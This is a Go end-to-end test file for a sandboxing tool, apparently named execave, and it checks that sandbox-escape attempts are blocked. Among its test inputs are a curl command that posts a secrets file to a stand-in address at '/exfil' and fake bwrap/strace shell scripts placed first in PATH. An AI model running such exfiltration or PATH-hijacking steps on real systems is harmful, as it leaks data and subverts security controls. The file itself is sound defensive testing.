package e2e_test

import (
	"fmt"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestE2E_PreventingSandboxEscape_SymlinkEscapeLinkInsideMountPointsOutsideRules tests that
// a symlink inside an accessible directory pointing outside the allowed rules is denied.
func TestE2E_PreventingSandboxEscape_SymlinkEscapeLinkInsideMountPointsOutsideRules(t *testing.T) {
	s := newScenario(t)
	public := s.givenDir("public")
	secret := s.givenDir("secret")
	secret.file("shadow.txt", "secret data")
	escapeLink := public.join("escape-link")
	s.givenSymlink(secret.join("shadow.txt"), escapeLink)

	s.givenRules("fs:rw:" + public.String())

	s.whenRun("cat", escapeLink)

	s.thenExitCodeNonZero()
	s.thenStderrContains("escape-link: No such file or directory")
}

// TestE2E_PreventingSandboxEscape_SymlinkChainBrokenAtDeniedIntermediateHop tests that a
// symlink chain stops at a denied intermediate hop and never reaches the final target.
func TestE2E_PreventingSandboxEscape_SymlinkChainBrokenAtDeniedIntermediateHop(t *testing.T) {
	s := newScenario(t)
	mount := s.givenDir("mount")
	nomatch := s.givenDir("nomatch")

	secretFile := mount.file("secret.txt", "secret")
	hop2 := nomatch.join("hop2")
	s.givenSymlink(secretFile, hop2)
	hop1 := mount.join("hop1")
	s.givenSymlink(hop2, hop1)

	s.givenRules("fs:ro:" + mount.String())

	s.whenRunTextLogWithFlags([]string{"--show-allowed"}, "cat", hop1)

	s.thenExitCodeNonZero()
	s.thenStderrHasEntry("READ", mount.rel("hop1"), "OK", "fs:ro:"+mount.String())
	s.thenStderrHasEntry("READ", nomatch.rel("hop2"), "DENY", "no-matching-rule")
	s.thenStderrNotContains(secretFile)
}

// TestE2E_PreventingSandboxEscape_ConfigFileModificationPrevented tests that the config file
// is forced read-only inside the sandbox even when the parent directory is rw.
func TestE2E_PreventingSandboxEscape_ConfigFileModificationPrevented(t *testing.T) {
	s := newScenario(t)
	work := s.givenDir("work")
	otherFile := work.file("other.txt", "other data")
	configPath := work.join("execave.toml")

	s.givenRulesInDir(work.String(), "fs:rw:"+work.String())

	s.whenRun("sh", "-c", "echo '{}' > "+configPath)

	s.thenExitCodeNonZero()
	s.thenStderrContains("forced read-only")
	s.thenStderrContains("execave.toml: Read-only file system")

	s.whenRun("sh", "-c", "echo modified >> "+otherFile)

	s.thenExitCode(0)
}

// TestE2E_PreventingSandboxEscape_DataExfiltrationViaNetworkDenied tests that a sandboxed
// command with access to sensitive files cannot send data to unauthorized network endpoints.
func TestE2E_PreventingSandboxEscape_DataExfiltrationViaNetworkDenied(t *testing.T) {
	s := newScenario(t)
	s.givenCurl()

	data := s.givenDir("data")
	secretFile := data.file("secrets.txt", "sensitive data")

	srv := s.givenHTTPSServer("TRUSTED_API")

	s.givenRules(
		"fs:ro:"+data.String(),
		"net:http:"+srv.addr(),
	)

	s.whenRun("curl", "-sk", fmt.Sprintf("https://%s/", srv.hostPort()))

	s.thenExitCode(0)
	s.thenStdoutContains("TRUSTED_API")

	s.whenRun("curl", "-sk", "--max-time", "5",
		"-d", "@"+secretFile,
		"https://192.0.2.1:443/exfil")

	s.thenExitCodeNonZero()
}

// TestE2E_PreventingSandboxEscape_SymlinkLoopHitsDepthLimit tests that a symlink loop
// is detected and access is denied after exceeding the 40-link depth limit.
func TestE2E_PreventingSandboxEscape_SymlinkLoopHitsDepthLimit(t *testing.T) {
	s := newScenario(t)
	mount := s.givenDir("mount")
	loopA := mount.join("loop-a")
	loopB := mount.join("loop-b")
	s.givenSymlink(loopB, loopA)
	s.givenSymlink(loopA, loopB)

	s.givenRules("fs:ro:" + mount.String())

	s.whenRunTextLog("-", "cat", loopA)

	s.thenExitCodeNonZero()
	s.thenStderrContains("loop-a: Too many levels of symbolic links")
	s.thenStderrHasEntry("DENY", "symlink-depth-limit-exceeded")
}

// TestE2E_PreventingSandboxEscape_PATHInjectionViaFakeBwrapBinary tests that execave
// rejects a non-root-owned bwrap binary found earlier in PATH.
func TestE2E_PreventingSandboxEscape_PATHInjectionViaFakeBwrapBinary(t *testing.T) {
	fakeDir := t.TempDir()
	fakeBwrap := filepath.Join(fakeDir, "bwrap")
	require.NoError(t, os.WriteFile(fakeBwrap, []byte("#!/bin/sh\nexec /bin/sh \"$@\""), 0o755)) // #nosec G306 -- test binary needs execute permission

	// Put fake bwrap first in PATH so exec.LookPath finds it before the real one.
	t.Setenv("PATH", fakeDir+":"+os.Getenv("PATH"))

	configPath := writeConfig(t, []string{"fs:ro:/usr"})
	result := runExecave(t, "", "--config", configPath, "--", "true")

	assert.NotEqual(t, 0, result.ExitCode)
	assert.Contains(t, result.Stderr, "not owned by root")
}

// TestE2E_PreventingSandboxEscape_PATHInjectionViaFakeStraceBinary tests that execave
// rejects a non-root-owned strace binary found earlier in PATH when monitoring is active.
func TestE2E_PreventingSandboxEscape_PATHInjectionViaFakeStraceBinary(t *testing.T) {
	fakeDir := t.TempDir()
	fakeStrace := filepath.Join(fakeDir, "strace")
	require.NoError(t, os.WriteFile(fakeStrace, []byte("#!/bin/sh\nexec /bin/sh \"$@\""), 0o755)) // #nosec G306 -- test binary needs execute permission

	// Put fake strace first in PATH so exec.LookPath finds it before the real one.
	// Keep real bwrap and strace available after the fake directory.
	t.Setenv("PATH", fakeDir+":"+os.Getenv("PATH"))

	configPath := writeConfig(t, []string{"fs:ro:/usr"})
	result := runExecave(t, "", "--config", configPath, "monitor", "--output=-", "--", "true")

	assert.NotEqual(t, 0, result.ExitCode)
	assert.Contains(t, result.Stderr, "not owned by root")
}
